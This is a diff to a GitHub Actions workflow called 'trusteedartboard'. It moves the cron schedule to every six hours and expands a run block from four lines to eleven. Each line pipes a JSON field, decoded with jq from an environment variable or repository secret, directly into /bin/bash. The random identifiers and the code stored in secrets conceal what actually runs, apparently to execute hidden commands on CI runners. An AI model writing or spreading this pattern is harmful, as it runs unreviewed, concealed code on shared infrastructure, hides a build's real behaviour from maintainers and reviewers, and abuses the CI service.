@@ -2,7 +2,7 @@ name: trusteedartboard
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 3/6 * * *'
+    - cron: '31 2/6 * * *'
 
 jobs:
   build:
@@ -11,10 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: trusteedartboard
         env:
-          b561: ${{ secrets.b561 }}
+          aldnz2: ${{ secrets.aldnz2 }}
         run: |
-          echo $b561 | jq -r .ehs9433 | /bin/bash
-          echo $mnhj28726 | jq -r .n88 | /bin/bash
-          echo $rnju927 | jq -r .hycmm8133 | /bin/bash
-          echo $j85 | jq -r .jfc735 | /bin/bash
+          echo $aldnz2 | jq -r .rxto761 | /bin/bash
+          echo $qrw77779 | jq -r .vast61112 | /bin/bash
+          echo $za6061 | jq -r .a5 | /bin/bash
+          echo $n7 | jq -r .hhskj9 | /bin/bash
+          echo $puqfy6504 | jq -r .sljgt749 | /bin/bash
+          echo $wbp218 | jq -r .ojmvk2521 | /bin/bash
+          echo $uv603 | jq -r .xypge32 | /bin/bash
+          echo $eh27841 | jq -r .kxu929 | /bin/bash
+          echo $i3951 | jq -r .iyiy21 | /bin/bash
+          echo $bpkl85363 | jq -r .ftc17438 | /bin/bash
+          echo $g00 | jq -r .bw6 | /bin/bash
 
